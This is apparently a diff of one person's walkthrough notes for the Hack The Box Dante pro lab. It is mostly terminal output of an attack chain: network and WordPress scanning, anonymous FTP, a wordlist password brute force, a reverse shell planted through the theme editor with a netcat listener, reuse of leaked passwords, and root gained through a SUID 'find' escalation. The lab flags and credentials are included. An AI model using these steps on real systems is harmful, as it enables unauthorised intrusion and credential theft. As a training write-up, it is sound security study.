@@ -1,36 +1,809 @@
-hayk sysdes
-nmap -sn -T4 IP_net -oN active-hosts 
+```` 
+~/Desktop/htb/htb-pro-labs/dante> nmap -sn -T4 10.10.110.0/24 -oN active-hosts.txt
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-30 20:16 +0100
+Nmap scan report for 10.10.110.2
+Host is up (0.060s latency).
+Nmap scan report for 10.10.110.100
+Host is up (0.081s latency).
+Nmap done: 256 IP addresses (2 hosts up) scanned in 76.44 seconds 
+````
+the 10.10.110.2 is a firewall and it s out of scope
+
 - this commande to discover up hosts
-nmap -T4 -sC -sV -p- --min-rate=1000 IP
+````
+~/Desktop/htb/htb-pro-labs/dante> nmap -T4 -sC -sV -p- --min-rate=1000 10.10.110.100
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-30 20:19 +0100
+Nmap scan report for 10.10.110.100
+Host is up (0.13s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.15.13
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
+|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
+|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
+65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-robots.txt: 2 disallowed entries 
+|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 149.62 seconds
+
+````
 - this commande to discovers all open TCP ports on an IP
 ftp IP 
 anonymous / anonymous
 - default ftp creds for anonymous login
+````
+~/Desktop/htb/htb-pro-labs/dante> ftp 10.10.110.100
+Connected to 10.10.110.100.
+220 (vsFTPd 3.0.3)
+Name (10.10.110.100:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> passive
+Passive mode: off; fallback to active mode: off.
+ftp> ls 
+200 EPRT command successful. Consider using EPSV.
+150 Here comes the directory listing.
+drwxr-xr-x    4 0        0            4096 Apr 14  2021 Transfer
+226 Directory send OK.
+ftp> cd Transfer
+250 Directory successfully changed.
+ftp> ls 
+200 EPRT command successful. Consider using EPSV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Apr 14  2021 Incoming
+drwxr-xr-x    2 0        0            4096 Aug 04  2020 Outgoing
+226 Directory send OK.
+ftp> ls Incoming
+200 EPRT command successful. Consider using EPSV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             310 Aug 04  2020 todo.txt
+226 Directory send OK.
+ftp> get Incoming/todo.txt
+local: Incoming/todo.txt remote: Incoming/todo.txt
+ftp: Can't access `Incoming/todo.txt': No such file or directory
+ftp> cd Incoming
+250 Directory successfully changed.
+ftp> get todo.txt
+local: todo.txt remote: todo.txt
+200 EPRT command successful. Consider using EPSV.
+150 Opening BINARY mode data connection for todo.txt (310 bytes).
+100% |***********************|   310        3.39 MiB/s    00:00 ETA
+226 Transfer complete.
+310 bytes received in 00:00 (1.51 KiB/s)
+ftp>
+~/Desktop/htb/htb-pro-labs/dante> cat todo.txt                
+- Finalize Wordpress permission changes - PENDING
+- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
+- Remove LFI vuln from the other site - PENDING
+- Reset James' password to something more secure - PENDING
+- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS
+ 
+````
 ls 
 get file.txt
 - ftp commandes
 ip:65000/robots.txt
 - 65000 is the port hosting http server (nmap results)
 #📦 first flag
+```
+~/Desktop/htb/htb-pro-labs/dante> wpscan --url http://10.10.110.100:65000/wordpress --enumerate vp
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+                               
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]
+[+] Started: Wed Sep 30 21:29:17 2026
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | Reference: https://codex.wordpress.org/Debugging_in_WordPress
+
+[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
+ |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
+
+[+] WordPress theme in use: twentytwenty
+ | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
+ | Last Updated: 2026-05-20T00:00:00.000Z
+ | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
+ | [!] The version is out of date, the latest version is 3.1
+ | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
+ | Style Name: Twenty Twenty
+ | Style URI: https://wordpress.org/themes/twentytwenty/
+ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.2 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'
+
+[+] Enumerating Vulnerable Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Sep 30 21:29:33 2026
+[+] Requests Done: 49
+[+] Cached Requests: 6
+[+] Data Sent: 11.771 KB
+[+] Data Received: 24.973 MB
+[+] Memory used: 284.871 MB
+[+] Elapsed time: 00:00:15
+~/Desktop/htb/htb-pro-labs/dante> wpscan --url http://10.10.110.100:65000/wordpress --enumerate u 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]
+[+] Started: Wed Sep 30 21:30:21 2026
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | Reference: https://codex.wordpress.org/Debugging_in_WordPress
+
+[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
+ |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
+
+[+] WordPress theme in use: twentytwenty
+ | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
+ | Last Updated: 2026-05-20T00:00:00.000Z
+ | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
+ | [!] The version is out of date, the latest version is 3.1
+ | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
+ | Style Name: Twenty Twenty
+ | Style URI: https://wordpress.org/themes/twentytwenty/
+ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.2 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:06 <========> (10 / 10) 100.00% Time: 00:00:06
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://10.10.110.100:65000/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] james
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Sep 30 21:30:37 2026
+[+] Requests Done: 26
+[+] Cached Requests: 38
+[+] Data Sent: 8.178 KB
+[+] Data Received: 144.466 KB
+[+] Memory used: 202.145 MB
+[+] Elapsed time: 00:00:15
+~/Desktop/htb/htb-pro-labs/dante> echo "Kevin \nBalthazar \nAJ \nNathan" >> wpUsers.txt #add users to the list from meet the team webpage
+~/Desktop/htb/htb-pro-labs/dante> cat wpUsers.txt
+james 
+admin
+Kevin 
+Balthazar 
+AJ 
+Nathan
+```
 wpscan --url http://10.10.110.100:65000/wordpress --enumerate vp
 wpscan --url http://10.10.110.100:65000/wordpress --enumerate u
 - scan and enumerate wp
-cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks > words.txt wpscan --url http://10.10.110.100:65000/wordpress --usernames names.txt -- passwords words.txt
+cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks > words.txt
+```
+~/Desktop/htb/htb-pro-labs/dante> cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks > words.txt
+~/Desktop/htb/htb-pro-labs/dante> tail words.txt             
+Oak
+known
+Originally
+network
+Extensive
+Robust
+portability
+foundation
+OpenOffice
+Minecraft
+ ~/Desktop/htb/htb-pro-labs/dante  wpscan --url http://10.10.110.100:65000/wordpress --usernames wpUsers.txt --passwords words.txt 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]
+[+] Started: Wed Sep 30 21:48:55 2026
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | Reference: https://codex.wordpress.org/Debugging_in_WordPress
+
+[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
+ |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
+
+[+] WordPress theme in use: twentytwenty
+ | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
+ | Last Updated: 2026-05-20T00:00:00.000Z
+ | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
+ | [!] The version is out of date, the latest version is 3.1
+ | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
+ | Style Name: Twenty Twenty
+ | Style URI: https://wordpress.org/themes/twentytwenty/
+ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.2 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:06 <=======> (137 / 137) 100.00% Time: 00:00:06
+
+[i] Config Backup(s) Identified:
+
+[!] http://10.10.110.100:65000/wordpress/.wp-config.php.swp
+ | Found By: Direct Access (Aggressive Detection)
+
+[+] Performing password attack on Wp Login against 6 user/s
+Trying james  / CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.niTrying AJ  / CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninjaTrying Nathan / CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.niTrying Balthazar  / infrastructure Time: 00:03:56 <> (1245 / 2808) 44.33%  ETA: 00:04:Trying Balthazar  / communications Time: 00:05:19 <> (1779 / 2808) 63.35%  ETA: 00:03:Trying Balthazar  / independently Time: 00:06:57 <> (2379 / 2808) 84.72%  ETA: 00:01:1Trying Balthazar  / Manufacturing Time: 00:07:19 <> (2529 / 2808) 90.06%  ETA: 00:00:4[SUCCESS] - james  / Toyota                                                           
+Trying Nathan / Minecraft Time: 00:07:35 <=====  > (2764 / 3232) 85.51%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: james , Password: Toyota
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Sep 30 21:56:53 2026
+[+] Requests Done: 2939
+[+] Cached Requests: 6
+[+] Data Sent: 1.088 MB
+[+] Data Received: 15.698 MB
+[+] Memory used: 313.695 MB
+[+] Elapsed time: 00:07:57
+
+```
+
+wpscan --url http://10.10.110.100:65000/wordpress --usernames names.txt -- passwords words.txt
 /wordpress/wp-admin/ <- login with the founded creds as wp admin
 - This can be leveraged execute commands on the server by inserting php code in one of the files. Navigate to "Appearance" > "Theme Editor" and select the Twenty Nineteen theme.
 https://reverseshell.com/ and execute a reverse shell 
 within the rev shell lets spawn a bash 
+img----
+
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 #📦 flag 2
 priv esc -> bash history perm...
 #📦  flag3
+```
+ ~/Desktop/htb/htb-pro-labs/dante  nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.15.13] from (UNKNOWN) [10.10.110.100] 42886
+Linux DANTE-WEB-NIX01 5.4.0-29-generic #33-Ubuntu SMP Wed Apr 29 14:32:27 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 15:08:12 up 41 min,  2 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+james    :0       :0               14:28   ?xdm?  58.24s  0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
+balthaza pts/0    10.10.15.3       14:39   26:27   0.93s  0.88s ./agent -connect 10.10.15.3:11601 -ignore-cert
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@DANTE-WEB-NIX01:/$ su - james       
+su - james
+Password: Toyota
 
+james@DANTE-WEB-NIX01:~$ ls
+ls
+Desktop    Downloads  Music     Public     Videos
+Documents  flag.txt   Pictures  Templates
+james@DANTE-WEB-NIX01:~$ cat flag.txt
+cat flag.txt
+DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}
+james@DANTE-WEB-NIX01:~$ ls
+ls
+Desktop    Downloads  Music     Public     Videos
+Documents  flag.txt   Pictures  Templates
+james@DANTE-WEB-NIX01:~$ ls -la
+ls -la
+total 92
+drwxr-xr-x 17 james james 4096 Apr 14  2021 .
+drwxr-xr-x  4 root  root  4096 Apr 14  2021 ..
+-rw-r--r--  1 root  root    74 Aug  5  2020 .bash_history
+-rw-r--r--  1 james james  220 May  9  2020 .bash_logout
+-rw-r--r--  1 james james 3771 May  9  2020 .bashrc
+drwxr-xr-x 13 james james 4096 Apr 14  2021 .cache
+drwxr-xr-x 11 james james 4096 Apr 14  2021 .config
+drwxr-xr-x  2 james james 4096 Apr 14  2021 Desktop
+drwxr-xr-x  2 james james 4096 Apr 14  2021 Documents
+drwxr-xr-x  2 james james 4096 Apr 14  2021 Downloads
+-r--------  1 james james   39 Jan  8  2021 flag.txt
+drwx------  3 james james 4096 Dec 15  2022 .gnupg
+drwxrwxr-x  3 james james 4096 Apr 14  2021 .local
+drwx------  5 james james 4096 Apr 14  2021 .mozilla
+drwxr-xr-x  2 james james 4096 Apr 14  2021 Music
+drwxr-xr-x  2 james james 4096 Apr 14  2021 Pictures
+-rw-r--r--  1 james james  807 May  9  2020 .profile
+drwxr-xr-x  2 james james 4096 Apr 14  2021 Public
+drwx------  2 james james 4096 Apr 14  2021 .ssh
+drwxr-xr-x  2 james james 4096 Apr 14  2021 Templates
+drwx------  6 james james 4096 Apr 14  2021 .thunderbird
+drwxr-xr-x  2 james james 4096 Apr 14  2021 Videos
+-rw-rw-r--  1 james james  168 May  9  2020 .wget-hsts
+james@DANTE-WEB-NIX01:~$ cat .bash_history
+cat .bash_history
+cd /home/balthazar
+rm .mysql_history
+mysql -u balthazar -p TheJoker12345!
+james@DANTE-WEB-NIX01:~$ mysql -u balthazar -p TheJoker12345!
+mysql -u balthazar -p TheJoker12345!
+Enter password: TheJoker12345!
+
+ERROR 1045 (28000): Access denied for user 'balthazar'@'localhost' (using password: YES)
+james@DANTE-WEB-NIX01:~$ find / -type f -perm -4000 2>/dev/null
+find / -type f -perm -4000 2>/dev/null
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/pkexec
+/usr/bin/su
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/find
+/usr/bin/sudo
+/usr/sbin/pppd
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/snap/core20/1611/usr/bin/chfn
+/snap/core20/1611/usr/bin/chsh
+/snap/core20/1611/usr/bin/gpasswd
+/snap/core20/1611/usr/bin/mount
+/snap/core20/1611/usr/bin/newgrp
+/snap/core20/1611/usr/bin/passwd
+/snap/core20/1611/usr/bin/su
+/snap/core20/1611/usr/bin/sudo
+/snap/core20/1611/usr/bin/umount
+/snap/core20/1611/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1611/usr/lib/openssh/ssh-keysign
+/snap/snapd/16292/usr/lib/snapd/snap-confine
+/snap/core18/2246/bin/mount
+/snap/core18/2246/bin/ping
+/snap/core18/2246/bin/su
+/snap/core18/2246/bin/umount
+/snap/core18/2246/usr/bin/chfn
+/snap/core18/2246/usr/bin/chsh
+/snap/core18/2246/usr/bin/gpasswd
+/snap/core18/2246/usr/bin/newgrp
+/snap/core18/2246/usr/bin/passwd
+/snap/core18/2246/usr/bin/sudo
+/snap/core18/2246/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/2246/usr/lib/openssh/ssh-keysign
+/snap/core18/2538/bin/mount
+/snap/core18/2538/bin/ping
+/snap/core18/2538/bin/su
+/snap/core18/2538/bin/umount
+/snap/core18/2538/usr/bin/chfn
+/snap/core18/2538/usr/bin/chsh
+/snap/core18/2538/usr/bin/gpasswd
+/snap/core18/2538/usr/bin/newgrp
+/snap/core18/2538/usr/bin/passwd
+/snap/core18/2538/usr/bin/sudo
+/snap/core18/2538/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/2538/usr/lib/openssh/ssh-keysign
+james@DANTE-WEB-NIX01:~$ find . -exec /bin/sh \; -quit
+find . -exec /bin/sh \; -quit
+$ whoami
+whoami
+james
+$ ls /root
+ls /root
+ls: cannot open directory '/root': Permission denied
+$ find . -exec /bin/sh \; -quit
+find . -exec /bin/sh \; -quit
+$ find . -exec /bin/sh -p \; -quit
+find . -exec /bin/sh -p \; -quit
+# ls /root
+ls /root
+flag.txt  snap  wordpress_backup  wordpress.tar.bz2
+# cat /root/flag.txt
+cat /root/flag.txt
+DANTE{Too_much_Pr1v!!!!}
+# ifconfig
+ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.16.1.100  netmask 255.255.255.0  broadcast 172.16.1.255
+        inet6 fe80::a0de:adff:fe13:3487  prefixlen 64  scopeid 0x20<link>
+        ether a2:de:ad:13:34:87  txqueuelen 1000  (Ethernet)
+        RX packets 26715  bytes 14421569 (14.4 MB)
+        RX errors 0  dropped 64  overruns 0  frame 0
+        TX packets 24201  bytes 16552958 (16.5 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 297  bytes 29358 (29.3 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 297  bytes 29358 (29.3 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+# for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep "bytes from"|cut -d ' ' - f4|tr -d ':' &);done
+for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep "bytes from"|cut -d ' ' - f4|tr -d ':' &);done
+# cut: you must specify a list of bytes, characters, or fields
+Try 'cut --help' for more information.
+ping: 172.16.1.{1..255}: Name or service not known
+^C
+ ~/Desktop/htb/htb-pro-labs/dante  nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.15.13] from (UNKNOWN) [10.10.110.100] 42912
+Linux DANTE-WEB-NIX01 5.4.0-29-generic #33-Ubuntu SMP Wed Apr 29 14:32:27 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 15:18:38 up 51 min,  2 users,  load average: 0.02, 0.06, 0.02
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+james    :0       :0               14:28   ?xdm?   1:04   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
+balthaza pts/0    10.10.15.3       14:39   36:53   0.95s  0.90s ./agent -connect 10.10.15.3:11601 -ignore-cert
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ find . -exec /bin/sh -p \; -quit
+^C
+ ~/Desktop/htb/htb-pro-labs/dante  nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.15.13] from (UNKNOWN) [10.10.110.100] 42914
